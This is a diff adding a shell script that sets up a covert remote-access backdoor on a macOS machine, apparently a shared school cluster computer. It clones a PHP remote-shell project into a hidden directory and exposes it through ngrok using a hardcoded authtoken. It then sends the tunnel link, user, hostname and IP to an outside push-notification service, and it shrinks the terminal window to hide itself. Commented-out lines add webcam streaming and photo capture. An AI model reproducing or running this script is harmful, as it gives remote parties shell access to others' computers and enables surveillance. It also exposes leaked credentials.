@@ -1,0 +1,50 @@
+#!/bin/sh
+
+api_android="k-1deb4a7ba1f3"
+daatee=$(date "+%Y_%m_%d_%H:%M")
+host="$(hostname)"
+PORT="8055"
+
+#Modifiy the terminal window size
+printf '\e[8;1;2t' 
+
+
+git clone https://github.com/vakandi/remote_access_php $HOME/._
+curl https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -o $HOME/._/ngrok.zip
+unzip $HOME/._/ngrok.zip -d $HOME/._/
+sh $HOME/._/clear_port.sh &
+
+sleep 2s
+$HOME/._/ngrok config add-authtoken 2McugxcxDRIG8tW8mup9hBZYQX9_7rMFxxJoWXxREeBmRvkNF
+$HOME/._/ngrok http $PORT > /dev/null &
+sleep 3s
+echo "$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url)"  > $HOME/._/shell_php/link
+
+link="$(cat $HOME/._/shell_php/link)"
+user="$(whoami)"
+
+echo "Waiting before sending the notifications..."
+echo "Ngrok link for external access ::::::"
+echo $link
+echo "\n\n"
+#Android Push notfications
+curl http://xdroid.net/api/message\?k\=$api_android\&t\=SHELL_PHP+Active\&c\=User:$user+Cluster+$host+$daatee+IP:+$(iplocal)\&u\=$link
+#iOS Push notfications
+#curl https://api.simplepush.io/send -d '{"key":"'"$api_ios"'", "msg":"'"$link"'"}'
+
+#Block the sessions from sleeping with caffeinate
+#UserEventAgent is suppose to be kill when the script gets locked, so this is the perfect failsafe
+
+#The staff block caffeinate command to prevent scholarship cheat
+#PID="$(ps -ax | grep "UserEventAgent (System)" | awk '{print $1}' | head -n1)"
+#caffeinate -d -i -w $PID &
+
+#live stream video
+#nohup sh $HOME/._/shell_php/php/script/video.sh &
+
+#nohup sh php/script/photos.sh &
+
+cd $HOME/._/shell_php 
+
+#Starting Php Server for external shell access outside of the cluster
+php -S 127.0.0.1:$PORT -t . > /dev/null &
